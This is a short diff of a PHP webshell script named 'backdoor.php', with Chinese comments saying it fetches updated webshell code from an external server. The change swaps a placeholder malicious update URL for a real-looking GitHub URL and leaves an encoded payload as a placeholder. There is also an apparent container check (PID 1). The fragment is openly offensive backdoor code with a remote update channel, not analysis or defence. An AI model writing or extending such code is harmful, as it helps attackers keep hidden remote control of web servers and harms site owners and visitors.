@@ -9,7 +9,7 @@ if (function_exists('getmypid') && getmypid() == 1) {
 
 // Webshell文件名称和外部服务器用于更新的URL
 $file = 'backdoor.php';
-$server_url = 'http://malicious-server.com/shell-update.php';  // 可被用来获取更新后的Webshell
+$server_url = 'https://github.com/yingfff123/123/edit/main/1.php';  // 可被用来获取更新后的Webshell
 
 // 初始化Webshell代码
 $encoded_code = '...';  // 动态生成或通过加密的代码
